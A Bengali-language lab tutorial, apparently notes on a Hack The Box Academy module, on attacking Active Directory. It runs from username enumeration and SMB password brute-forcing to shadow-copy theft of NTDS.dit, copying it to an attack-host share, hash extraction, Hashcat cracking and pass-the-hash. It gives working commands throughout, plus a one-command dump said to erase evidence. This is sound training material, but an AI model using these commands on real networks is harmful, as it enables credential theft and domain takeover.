# Attacking Active Directory and NTDS.dit - [LINK](https://academy.hackthebox.com/app/module/147/section/1326)



মডার্ন কর্পোরেট নেটওয়ার্কে Active Directory (AD) হলো সবচেয়ে গুরুত্বপূর্ণ একটি সার্ভিস। কোনো প্রতিষ্ঠান যদি উইন্ডোজ ব্যবহার করে, তবে ধরে নেওয়া যায় তারা সেই উইন্ডোজ সিস্টেমগুলোকে ম্যানেজ করার জন্য AD ব্যবহার করছে। এই সেকশনে আমরা মূলত ডিকশনারি অ্যাটাক (Dictionary Attack) এবং NTDS.dit ফাইল থেকে পাসওয়ার্ড হ্যাশ ডাম্প করার পদ্ধতিগুলো শিখব।

উইন্ডোজ সিস্টেম যখন কোনো ডোমেইনের (Domain) সাথে যুক্ত হয়, তখন সেটি লগইন রিকোয়েস্ট চেক করার জন্য আর নিজের লোকাল SAM ডাটাবেসের ওপর নির্ভর করে না। এর বদলে সে রিকোয়েস্টটি Domain Controller (DC) এর কাছে পাঠায়। তবে এর মানে এই নয় যে SAM ডাটাবেস পুরোপুরি অকেজো হয়ে যায়। কেউ চাইলে `Hostname\Username` অথবা সরাসরি `.\Username` লিখে লোকাল অ্যাকাউন্টে লগইন করতে পারে।

## Dictionary attacks against AD accounts (AD অ্যাকাউন্টের বিরুদ্ধে ডিকশনারি অ্যাটাক)

ডিকশনারি অ্যাটাক মানে হলো কম্পিউটারকে ব্যবহার করে একটি নির্দিষ্ট লিস্ট থেকে ইউজারনেম এবং পাসওয়ার্ড বারবার ট্রাই বা গেস (Guess) করা। তবে নেটওয়ার্কে এই কাজ করা বেশ ঝুঁকিপূর্ণ, কারণ এটি প্রচুর ট্রাফিক তৈরি করে এবং লগ ফাইলে ধরা পড়ে যায়। এমনকি বারবার ভুল পাসওয়ার্ড দিলে Group Policy এর কারণে অ্যাকাউন্ট লক (Lockout) হয়ে যেতে পারে।

এজন্য অন্ধের মতো অ্যাটাক না করে আমাদের উচিত OSINT (যেমন: সোশ্যাল মিডিয়া বা কোম্পানির ওয়েবসাইট) ব্যবহার করে কর্মীদের আসল নাম খুঁজে বের করা।

কোম্পানিগুলো সাধারণত ইউজারনেম তৈরির ক্ষেত্রে একটি নির্দিষ্ট প্যাটার্ন বা নিয়ম মেনে চলে। নিচে কিছু সাধারণ নিয়ম দেওয়া হলো (ধরি নাম: Jane Jill Doe):

| ইউজারনেমের ধরন (Convention) | উদাহরণ (Practical example) |
| --- | --- |
| নামের প্রথম অক্ষর + শেষের নাম (firstinitiallastname) | jdoe |
| প্রথম অক্ষর + মাঝের নামের প্রথম অক্ষর + শেষের নাম | jjdoe |
| প্রথম নাম + শেষের নাম (firstnamelastname) | janedoe |
| প্রথম নাম.শেষের নাম (firstname.lastname) | jane.doe |
| শেষের নাম.প্রথম নাম (lastname.firstname) | doe.jane |
| ডাকনাম (nickname) | doe |

অনেক সময় ইমেইল অ্যাড্রেস দেখেই ইউজারনেম বোঝা যায় (যেমন `jdoe@inlanefreight.com` থেকে বোঝা যায় ইউজারনেম `jdoe`)। গুগল ডর্ক (Google Dorks) ব্যবহার করে পিডিএফ ফাইলের মেটাডাটা থেকেও অনেক সময় আসল ইউজারনেম পাওয়া যায়।

### Creating a custom list of usernames (ইউজারনেমের কাস্টম লিস্ট তৈরি করা)

আমরা চাইলে টেক্সট এডিটর (যেমন: Vim) দিয়ে ম্যানুয়ালি একটি ইউজারনেমের লিস্ট বানাতে পারি। অথবা, [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) এর মতো অটোমেটেড রুবী (Ruby) স্ক্রিপ্ট ব্যবহার করে একটি সাধারণ নামের লিস্ট থেকে সম্ভাব্য সব ধরনের ইউজারনেমের কম্বিনেশন তৈরি করে নিতে পারি।

```shellsession
00Luffy00@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

```

এই কমান্ডটি `names.txt` ফাইলে থাকা নামগুলো থেকে শত শত ইউজারনেম জেনারেট করে দেবে।

## Enumerating valid usernames with Kerbrute (Kerbrute দিয়ে আসল ইউজারনেম যাচাই করা)

পাসওয়ার্ড গেস করার আগে আমাদের নিশ্চিত হওয়া উচিত যে আমরা যে ইউজারনেমগুলো ট্রাই করছি, সেগুলো আদৌ সিস্টেমে আছে কিনা। এর জন্য **Kerbrute** টুলটি ব্যবহার করা হয়। এটি অ্যাকাউন্ট লক না করেই ইউজারনেমের অস্তিত্ব যাচাই করতে পারে।

```shellsession
00Luffy00@htb[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

```

এই কমান্ডটি চালানোর পর আউটপুটে `[+] VALID USERNAME:` লেখা আসলে বুঝতে হবে ওই ইউজারনেমটি সত্যি সত্যি সিস্টেমে আছে।

## Launching a brute-force attack with NetExec (NetExec দিয়ে ব্রুট-ফোর্স অ্যাটাক শুরু করা)

সঠিক ইউজারনেম পাওয়ার পর আমরা NetExec ব্যবহার করে SMB প্রোটোকলের মাধ্যমে ডোমেইন কন্ট্রোলারে লগইন করার চেষ্টা করতে পারি:

```shellsession
00Luffy00@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

```

* এখানে `-u` দিয়ে ইউজারনেম এবং `-p` দিয়ে পাসওয়ার্ডের লিস্ট (fasttrack.txt) বুঝানো হয়েছে।
* আউটপুটে `STATUS_LOGON_FAILURE` মানে পাসওয়ার্ড ভুল।
* আউটপুটে `(Pwn3d!)` বা `[+]` দেখলে বুঝতে হবে পাসওয়ার্ড মিলে গেছে!

**Event logs from the attack:** এই ধরনের অ্যাটাক চালালে উইন্ডোজের Event Viewer এর Security লগে তা রেকর্ড হয়ে যায় (যেমন Event ID 4624 বা 4776)। তাই ক্লায়েন্টকে রিপোর্ট দেওয়ার সময় এই লগগুলোর কথা উল্লেখ করলে রিপোর্টের মান বৃদ্ধি পায়।

## Capturing NTDS.dit (NTDS.dit ফাইল চুরি করা)

**NTDS.dit** হলো Active Directory এর মূল ডাটাবেস ফাইল। এটি ডোমেইন কন্ট্রোলারের `%systemroot%/ntds` ফোল্ডারে থাকে। এই ফাইলে ডোমেইনের সমস্ত ইউজারনেম এবং তাদের পাসওয়ার্ডের হ্যাশ স্টোর করা থাকে। এটি হাতে পাওয়া মানে পুরো ডোমেইন বা নেটওয়ার্কের কন্ট্রোল পেয়ে যাওয়া।

### Connecting to a DC with Evil-WinRM (DC তে কানেক্ট করা)

আগের ধাপে পাওয়া পাসওয়ার্ডটি দিয়ে আমরা Evil-WinRM এর মাধ্যমে ডোমেইন কন্ট্রোলারে (DC) লগইন করব:

```shellsession
00Luffy00@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'

```

### Checking privileges (পারমিশন চেক করা)

টার্মিনালে ঢোকার পর আমাদের দেখতে হবে এই ইউজারের অ্যাডমিন ক্ষমতা আছে কিনা।

* `net localgroup` দিয়ে লোকাল গ্রুপের মেম্বারশিপ দেখা যায়।
* `net user bwilliamson` দিয়ে ওই ইউজারের বিস্তারিত দেখা যায়।
যদি ইউজারটি `Administrators` বা `Domain Admins` গ্রুপের সদস্য হয়, তবে আমরা NTDS.dit কপি করার ক্ষমতা রাখি।

### Creating shadow copy of C: (C: ড্রাইভের শ্যাডো কপি তৈরি করা)

NTDS.dit ফাইলটি সব সময় সিস্টেম ব্যবহার করতে থাকে, তাই সাধারণ `copy` কমান্ড দিয়ে এটি কপি করা যায় না। ফাইলটিকে কপি করার জন্য আমাদের **Volume Shadow Copy (VSS)** সার্ভিস ব্যবহার করতে হবে। VSS চলমান সিস্টেমের কোনো ক্ষতি না করেই ড্রাইভের একটি স্ন্যাপশট বা কপি তৈরি করতে পারে।

```shellsession
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

```

এটি সফল হলে একটি `Shadow Copy Volume Name` (যেমন: `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`) তৈরি হবে।

### Copying NTDS.dit from the VSS (VSS থেকে ফাইল কপি করা)

এবার আমরা সেই শ্যাডো কপি থেকে ফাইলটি সাধারণ ফোল্ডারে (যেমন `c:\NTDS\`) কপি করে আনব:

```shellsession
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

```

নোট: SAM ফাইলের মতো NTDS.dit ফাইলের হ্যাশগুলোও SYSTEM ফাইল দিয়ে এনক্রিপ্ট করা থাকে। তাই ডিক্রিপ্ট করার জন্য আমাদের SYSTEM ফাইলটিও কপি করতে হবে।

এরপর `move` কমান্ড দিয়ে ফাইলটি আমাদের অ্যাটাকিং মেশিনের SMB শেয়ারে পাঠিয়ে দেব।

### Transferring NTDS.dit to attack host

Now cmd.exe /c move can be used to move the file from the target DC to the share on our attack host.

```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

## Extracting hashes from NTDS.dit (NTDS.dit থেকে হ্যাশ বের করা)

ফাইলটি আমাদের লিনাক্স মেশিনে চলে আসার পর, Impacket এর `secretsdump` টুল দিয়ে আমরা হ্যাশগুলো বের করে আনতে পারি:

```shellsession
00Luffy00@htb[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

```

এটি রান করলে ডোমেইনের সমস্ত ইউজারের NT হ্যাশ স্ক্রিনে চলে আসবে।

### A faster method: Using NetExec (NetExec দিয়ে এক কমান্ডে সব করা)

ম্যানুয়ালি শ্যাডো কপি তৈরি, ফাইল কপি এবং ট্রান্সফার করার ঝামেলা এড়াতে আমরা NetExec এর `ntdsutil` মডিউল ব্যবহার করতে পারি। এটি এক কমান্ডেই সব কাজ করে দেয়:

```shellsession
00Luffy00@htb[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil

```

এই কমান্ডটি নিজেই VSS তৈরি করবে, ডাটা ডাম্প করবে এবং হ্যাশগুলো টার্মিনালে দেখিয়ে সিস্টেম থেকে সব প্রমাণ মুছে ফেলবে।

## Cracking hashes and gaining credentials (হ্যাশ ক্র্যাক করা)

আমরা যে NT হ্যাশগুলো পেলাম, সেগুলো Hashcat দিয়ে ক্র্যাক করে আসল পাসওয়ার্ড বের করতে পারি। NT হ্যাশের মোড হলো `1000`।

```shellsession
00Luffy00@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

```

### Pass the Hash (PtH) (হ্যাশ ক্র্যাক না হলে কী হবে?)

যদি পাসওয়ার্ড অনেক কঠিন হয় এবং Hashcat সেটি ক্র্যাক করতে ব্যর্থ হয়, তবুও চিন্তার কিছু নেই! NTLM অথেনটিকেশন প্রোটোকলের দুর্বলতার কারণে আমরা সরাসরি পাসওয়ার্ডের হ্যাশটি দিয়েই সিস্টেমে লগইন করতে পারি। একে **Pass-the-Hash (PtH)** অ্যাটাক বলে।

Evil-WinRM এ পাসওয়ার্ডের বদলে হ্যাশ ব্যবহার করতে `-H` ফ্ল্যাগটি দিতে হয়:

```shellsession
00Luffy00@htb[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

```

এইভাবে কোনো পাসওয়ার্ড না জেনেই শুধুমাত্র হ্যাশ ব্যবহার করে আমরা ডোমেইনের অন্যান্য সিস্টেমেও লগইন (Lateral Movement) করতে পারি।
